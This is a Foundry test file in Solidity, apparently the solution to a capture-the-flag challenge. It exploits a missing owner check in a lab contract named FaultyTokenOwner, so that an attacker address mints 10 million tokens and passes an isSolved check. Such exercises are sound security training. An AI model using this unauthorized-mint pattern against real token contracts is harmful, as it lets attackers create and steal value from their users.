// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;


import {Test, console} from "forge-std/Test.sol";
import "../src/FaultyTokenOwner.sol";

// to run: forge test --match-contract FaultyTokenOwnerTest -vvvv

contract FaultyTokenOwnerTest is Test {
    FaultyTokenOwner public token;
    address public attacker = address(1);
    uint256 public targetMintAmount = 1_000_000 * 10 ** 18; // 1 million tokens

    function setUp() public {
        // Deploy the FaultyOwnerToken contract
        token = new FaultyTokenOwner();
    }

    // Test the exploit to bypass the owner check and mint 1 million tokens
    function testExploit() public {

        vm.startPrank(attacker);

        //log attacker initial balance
        console.log("Attacker initial balance:", token.balanceOf(attacker));

        

        //user can mint any number of tokens
        token.mint(10_000_000 * 10 ** 18);

        //console.log attackers balance
        console.log("Attacker balance after exploit: ", token.balanceOf(attacker));

        // Call the isSolved function for the attacker
        bool solved = isSolved(attacker);
        console.log("Is the challenge solved?", solved);


        vm.stopPrank();

    }

    // Function to check if the challenge is solved
    function isSolved(address user) public view returns (bool) {
        // The challenge is solved if the user has minted 1 million tokens
        return token.balanceOf(user) >= targetMintAmount;
    }
}
